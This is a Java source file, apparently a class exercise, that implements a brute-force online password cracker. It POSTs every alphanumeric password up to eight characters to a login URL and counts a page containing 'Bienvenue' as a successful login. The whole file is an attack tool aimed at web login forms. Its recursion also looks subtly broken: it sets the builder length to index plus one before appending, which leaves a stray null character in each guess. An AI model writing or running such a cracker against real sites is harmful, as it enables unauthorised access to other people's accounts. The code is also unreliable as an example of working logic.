import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class BruteForceOnlinePasswordCracker implements OnlinePasswordCracker {
    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static final int MAX_LENGTH = 8;

    @Override
    public String crack(String url, String login) {
        for (int length = 1; length <= MAX_LENGTH; length++) {
            String password = bruteForceHelper(url, login, length);
            if (password != null) {
                return password;
            }
        }
        return null;
    }

    private String bruteForceHelper(String url, String login, int length) {
        StringBuilder sb = new StringBuilder(length);
        char[] password = new char[length];
        return bruteForceRecursive(url, login, sb, password, 0) ? sb.toString() : null;
    }

    private boolean bruteForceRecursive(String url, String login, StringBuilder sb, char[] password, int index) {
        if (index == password.length) {
            String passwordAttempt = sb.toString();
            if (authenticate(url, login, passwordAttempt)) {
                return true;
            }
        } else {
            for (char c : CHARACTERS.toCharArray()) {
                password[index] = c;
                sb.setLength(index + 1);
                sb.append(c);
                if (bruteForceRecursive(url, login, sb, password, index + 1)) {
                    return true;
                }
            }
        }

        return false;
    }

    private boolean authenticate(String url, String login, String password) {
        try {
            String data = "login=" + URLEncoder.encode(login, "UTF-8") +
                    "&password=" + URLEncoder.encode(password, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(data.getBytes());

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                // Vérifier si la réponse contient des éléments spécifiques indiquant une authentification réussie
                return response.toString().contains("Bienvenue");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }
}